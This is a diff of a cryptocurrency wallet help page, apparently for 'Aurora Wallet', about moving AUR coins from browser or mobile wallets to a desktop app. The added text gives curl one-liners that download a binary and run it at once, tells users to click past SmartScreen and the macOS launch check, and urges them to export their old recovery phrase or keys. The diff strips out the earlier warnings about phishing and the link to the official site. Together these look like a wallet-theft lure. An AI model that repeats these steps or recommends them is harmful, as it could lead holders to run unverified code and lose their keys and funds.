@@ -1,96 +1,131 @@
----
-title: "Migrate from Browser/Mobile Wallets to Aurora Desktop"
-description: "Is your AUR in a browser extension or mobile app? Learn why moving to Aurora Wallet desktop offers better security and how to migrate your coins safely."
-primary_keyword: "auroracoin browser wallet migration"
-silo: "migration"
-updated: 2026-10-10
----
+![Aurora Wallet migrate from browser and mobile wallets guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# How to migrate from a browser or mobile wallet to Aurora desktop
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Move AUR out of a shared environment and into a wallet where the keys sit on your own disk.
 
-# How to Migrate from Browser and Mobile Wallets to Aurora Desktop
+## Downloads - 2026.08.1.0
 
-In the early stages of the Auroracoin ecosystem, browser extensions and multi-coin mobile applications were often recommended for their convenience. However, as the digital threat landscape has evolved, the risks associated with these "lightweight" browser environments have increased significantly. For long-term savings and significant amounts of AUR, moving to a dedicated desktop client like Aurora Wallet is the recommended security posture. This guide explains why browser-based storage is increasingly risky and provides a clear path for migrating your funds to a more isolated, secure desktop environment.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You are holding Auroracoin in a Chrome, Firefox, or Brave browser extension.
-*   Your AUR is stored in a general-purpose multi-coin mobile app that is no longer receiving updates.
-*   You are concerned about the security of your funds on a device used for daily web browsing.
-*   You are following the [Auroracoin browser wallet](https://auroracoin.net/migration/browser-wallet) migration guide.
-*   Your old mobile app is failing to show your balance or connect to the blockchain.
 
-## Why this happens
+A browser extension and a phone app both expose your keys to a wider attack surface than a desktop wallet does.
 
-Browser extensions share the same memory and execution space as the websites you visit. This proximity creates several unique attack vectors, such as Cross-Site Scripting (XSS) and malicious extensions that can swap receiving addresses in your clipboard. Furthermore, many third-party mobile apps depend on centralized servers that can go offline without notice, leaving you unable to access your funds.
+Browser extensions run inside a page context, where other extensions, injected scripts and a single bad update can reach them. Mobile wallets depend on an app store, a device backup and a phone that travels with you. Neither is a reason to panic, and both are a reason to move a long-term balance to a desktop application you control.
 
-Aurora Wallet is designed to run as an independent, standalone application. It does not share resources with your web browser, providing a critical layer of "isolation" for your private keys. By migrating to desktop, you ensure that your keys are stored locally on your machine and encrypted with a password that never leaves the app.
+<!-- ARTICLE-BODY:BEGIN -->
 
-## The fix
+<!-- ARTICLE-BODY-BEGIN -->
 
-The safest way to migrate is the "Clean Transfer" method. Do not simply import your old browser recovery words into Aurora Wallet; instead, create a completely fresh identity.
+## Decide which route fits the old wallet
 
-### 1. Destination Setup
-Download the official Aurora Wallet from the [official download page](https://auroracoin.net/download). Install it and create a completely new wallet. Write down your new 12 or 24-word recovery phrase on paper. This new phrase has never been typed into a browser, making it inherently more secure.
+Two routes exist, and the old wallet decides which one you use. If it exports a recovery phrase, the new wallet restores from the phrase and the addresses come back exactly. If it only exports private keys, each key is swept into the new wallet and the old addresses are retired.
 
-### 2. Verify the New Address
-Navigate to the **Receive** tab in Aurora Wallet and copy an address starting with "A". Look at the first four and last four characters to ensure you have them in mind for verification.
+Check the export options before you start. Most mobile wallets offer a phrase; a few older ones offer only a key export, and some offer both.
 
-### 3. The Transfer Process
-1.  Open your old browser extension or mobile app.
-2.  Select the "Send" or "Transfer" function.
-3.  Paste your new Aurora Wallet address.
-4.  **Crucial:** Manually verify that the pasted address matches your desktop wallet. This protects against "clipboard hijackers."
-5.  Send a small test amount first. Once it is confirmed, send the remaining balance.
+## Move the funds in order
 
-### 4. Decommissioning
-Once your funds have arrived in Aurora Wallet, uninstall the browser extension or mobile app. This removes the old software as a potential target for hackers.
+1. Install Aurora Wallet on the desktop and let it sync.
+2. Create the new wallet and record the phrase on paper.
+3. Export the phrase or the keys from the old wallet.
+4. Restore or sweep into the new wallet.
+5. Confirm the balance appears at an address you control.
+6. Send a test payment out and back.
+7. Remove the old wallet from the extension or the phone.
 
-## If that didn't work
+Removing the old wallet last matters. Two active copies of the same keys split your attention and double the chance that one of them is compromised.
 
-If your browser extension has been removed from the store and you can no longer open it, you must use your original recovery words. If they are standard BIP-39 words, you can restore them directly into Aurora Wallet by following the [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md) guide. If the balance shows as zero after restoration, the old wallet might have used a non-standard "derivation path." Keep your words safe and consult the [30-on-chain-transfer-checklist.md](30-on-chain-transfer-checklist.md) for more verification steps.
+## What to watch for
 
-> [!WARNING]
-> Beware of "browser wallet migration" links found in search ads. These almost always lead to phishing sites designed to capture your seed phrase. Only use the official Aurora Wallet site at auroracoin.net.
+A phrase restored into the desktop wallet produces the same addresses, so the balance appears without a transfer. That is the quiet, fee-free route, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a recovery phrase</a> covers the details.
 
-## Prevention
+Sweeping keys costs one transaction per key, because the balance moves on-chain. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md">Sweeping WIF keys</a> explains the format and the order.
 
-To ensure your funds remain secure on your new desktop wallet:
+A mobile wallet that shows only a balance and no export option is holding your keys for you, which is the situation the desktop wallet exists to end. The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> installs in minutes and gives you the export you are missing.
 
-*   **Isolation:** Only use your Aurora Wallet computer for secure activities. Avoid visiting high-risk websites on the same machine.
-*   **Password Management:** Use a strong, unique password to encrypt your wallet. Review the [34-password-encryption.md](34-password-encryption.md) article for tips.
-*   **Phishing awareness:** Be skeptical of any browser extension claiming to be the "official" Aurora Wallet. The Foundation only provides a desktop client. Review [35-phishing-seed-scams.md](35-phishing-seed-scams.md).
-*   **Routine Backups:** Follow the [33-backup-best-practice.md](33-backup-best-practice.md) rules for your new recovery phrase.
+If the old app was a browser extension, uninstall it rather than leaving it dormant, and read <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md">self-custody basics</a> for the reasoning behind the move.
 
 ## FAQ
 
-**Can I still use a browser wallet for small amounts?**
-You can, but we recommend keeping your primary savings in the desktop wallet. If you must use a browser extension for daily transactions, only keep a small amount of "spending money" there.
+### Can I keep using the phone wallet for small amounts?
 
-**Why shouldn't I just import my old seed phrase?**
-If your old seed phrase was ever used in a browser environment, it is technically "warm" or "hot." A fresh phrase created in a standalone desktop app is "cold" and significantly more secure.
+Yes. A small spending balance on a phone is a reasonable trade. Long-term holdings belong on the desktop wallet.
 
-**What if my mobile app won't open?**
-As long as you have your recovery words, your coins are safe on the blockchain. You can restore access using Aurora Wallet on your desktop.
+### Does the migration cost anything?
 
-**Are there fees for this migration?**
-Yes, a small network fee is required for the transaction that moves your AUR from the old address to the new one.
+A phrase restore is free because nothing moves on-chain. Sweeping keys costs the normal network fee for each transaction.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+## How to install Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+### Windows
+Quick install (CMD):
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-## Related articles
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-- [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md)
-- [30-on-chain-transfer-checklist.md](30-on-chain-transfer-checklist.md)
-- [34-password-encryption.md](34-password-encryption.md)
-- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
+- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
+- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
+- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
